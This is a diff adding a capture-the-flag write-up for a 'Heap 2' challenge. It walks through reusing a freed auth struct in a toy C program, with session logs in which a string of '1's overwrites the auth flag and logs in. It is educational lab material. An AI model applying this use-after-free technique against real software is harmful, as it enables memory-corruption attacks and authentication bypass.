@@ -1,0 +1,53 @@
+---
+author: Esteban Aranda
+---
+
+##Heap 2 Writeup
+
+By examining the source code we can see that this problem has an auth structure made up of a 32 byte-long string and an int. Two pointers are defined, one to an auth struct and one to a "service" character. The program runs on an infinite while loop and there are four commands we can run, `auth`, `reset`, `service`, and `login`. Based on what command we run the program proceeds to do different actions. Our goal is to successfully log in to read the flag. To help us out, there is also a print statement that prints the memory addresses of our two variables.
+
+Unlike previous heap problems, this problem reads user input from stdin using `fgets()`, so we cannot overflow it, and the `auth` commands also checks for length of the string. However, our plan is still to somehow overwrite `auth->auth` with `1`.
+
+We can first call the commands to see what they do:
+
+`
+[ auth = (nil), service = (nil) ]                                                                                          
+auth AAAA                                                                                                                  
+[ auth = 0x804b818, service = (nil) ]                                                                                      
+service BBBB
+[ auth = 0x804b818, service = 0x804b828 ]                                                                                  
+login                                                                                                                      
+please enter your password                                                                                                 
+[ auth = 0x804b818, service = 0x804b828 ]                                                                                  
+reset
+[ auth = 0x804b818, service = 0x804b828 ]
+`
+
+We can see that the auth struct still points to the same location in memory even after calling `reset`, which is supposed to `free()` it. This is a Use-After-Free vulnerability that we can exploit because the `login` command will still try to access the “freed” `auth->auth`.
+
+`
+[ auth = (nil), service = (nil) ]                                                                                          
+auth AAAA                                                                                                                  
+[ auth = 0x804b818, service = (nil) ]                                                                                      
+reset                                                                                                                      
+[ auth = 0x804b818, service = (nil) ]                                                                                      
+service BBBB
+[ auth = 0x804b818, service = 0x804b818 ]                                                                                  
+`
+
+By first allocating memory for the auth struct, then freeing it, and then allocating memory for service we can see that the program allocates memory at the same location in the heap. We can use this to our advantage by repeating this sequence of commands but calling `service` with multiple `1`’s, with which `strdup()` will overwrite `auth->auth`.
+
+`
+[ auth = (nil), service = (nil) ]                                                                                          
+auth AAAA                                                                                                                  
+[ auth = 0x804b818, service = (nil) ]                                                                                      
+reset                                                                                                                      
+[ auth = 0x804b818, service = (nil) ]                                                                                      
+service 11111111111111111111111111111                                                                                      
+[ auth = 0x804b818, service = 0x804b828 ]                                                                                  
+login                                                                                                                      
+you have logged in already!                                                                                                
+flag: hello world!
+                                                                            
+[ auth = 0x804b818, service = 0x804b828 ]
+`
